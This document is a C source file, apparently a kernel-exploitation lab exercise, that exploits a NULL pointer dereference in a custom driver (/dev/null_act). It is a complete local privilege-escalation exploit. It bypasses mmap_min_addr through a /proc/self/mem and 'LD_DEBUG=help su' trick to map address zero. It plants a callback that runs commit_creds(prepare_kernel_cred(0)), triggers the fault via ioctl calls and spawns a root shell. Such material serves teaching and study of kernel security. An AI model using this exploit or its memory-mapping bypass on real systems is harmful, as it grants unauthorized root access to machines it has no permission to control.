/*
 * Experiments with Linux kernel exploitation of null-ptr-deref
 * without mmap_min_addr
 */

#define _GNU_SOURCE

#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ioctl.h>

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COMMIT_CREDS_PTR 0xffffffff81084370lu
#define PREPARE_KERNEL_CRED_PTR 0xffffffff810845a0lu

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2)
{
	commit_creds(prepare_kernel_cred(0));
}

// copy the definition of null_item_t  from mod
struct null_t
{
	struct null_item_t *item;
};
struct null_item_t
{
	uint32_t foo;
	void (*callback)(void);
	char bar[1];
};
/* ========================================================================== */

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/bin/sh",
		"-i",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork()");
		return;
	}

	if (pid == 0) {
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
		exit(EXIT_FAILURE);
	}

	if (wait(&status) < 0)
		perror("[-] wait");
}

void init_payload(void *p)
{
	struct null_item_t *item = (struct null_item_t *)p;

	item->callback = (uint64_t)root_it;

	printf("[+] payload:\n");
	printf("\tstart at %p\n", p);
	printf("\tcallback at %p\n", &item->callback);
	printf("\tcallback %lx\n", item->callback);
}

int main(void)
{
	int ret = EXIT_FAILURE;
	int mem_fd = -1;
	char cmd[1000];
	void *map = NULL;
	unsigned long addr = 0;
	printf("[+] begin as: uid=%d, euid=%d\n", getuid(), geteuid());
	/* Fill your code to use a CVE to map zero address */
	map = mmap((void *)0x10000, 0x1000, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);
	if (map == MAP_FAILED)
	{
		perror("[-] mmap failed");
		goto end;
	}
	else
	{
		printf("[+] mmap done\n");
	}

	mem_fd = open("/proc/self/mem", O_RDWR);
	if (mem_fd == -1)
	{
		perror("[-] open mem failed");
		goto end;
	}
	else
	{
		printf("[+] open mem done\n");
	}

	addr = (unsigned long)map;
	sprintf(cmd, "LD_DEBUG=help su 1>&%d", mem_fd);
	printf("[+] addr: \n");
	while (addr != 0)
	{
		printf("%x -> ", addr);
		addr -= 0x1000;
		if (lseek(mem_fd, addr, SEEK_SET) == -1)
		{
			perror("[-] lseek failed");
			goto end;
		}
		system(cmd);
	}

	printf("%x\n", addr);
	printf("[+] /proc/$PPID/maps:\n");
	system("head -n1 /proc/$PPID/maps");
	printf("[+] data at NULL: 0x%lx\n", *(unsigned long *)0);
	
	/* Fill your code to set a null pointer */
	int fd = open("/dev/null_act", O_WRONLY);
	if (fd == -1)
		perror("[-] open failed\n");

	ret = ioctl(fd, 0x40001);
	if (ret != 0)
		perror("[-] NULL_ACT_ALLOC failed\n");
	else
		printf("NULL_ACT_ALLOC success\n");
	ret = ioctl(fd, 0x40004);
	if (ret != 0)
		perror("[-] NULL_ACT_RESET failed\n");
	else
		printf("NULL_ACT_RESET success\n");
	printf("set a null pointer\n");

	// Modify content at the address 0 or NULL before triggering NULL Pointer Dereference
	init_payload((void *)NULL);

	/* Fill your code to dereference a null pointer */
	ret = ioctl(fd, 0x40002);
	if (ret != 0)
		perror("[-] NULL_ACT_CALLBACK failed\n");
	else
		printf("NULL_ACT_CALLBACK success\n");
	/* You can call this to invoke a root shell */
	if (getuid() == 0 && geteuid() == 0) {
		printf("[+] finish as: uid=0, euid=0, start sh...\n");
		run_sh();
		ret = EXIT_SUCCESS;
	} else {
		printf("[-] didn't get root\n");
		goto end;
	}
end:
	return ret;
}
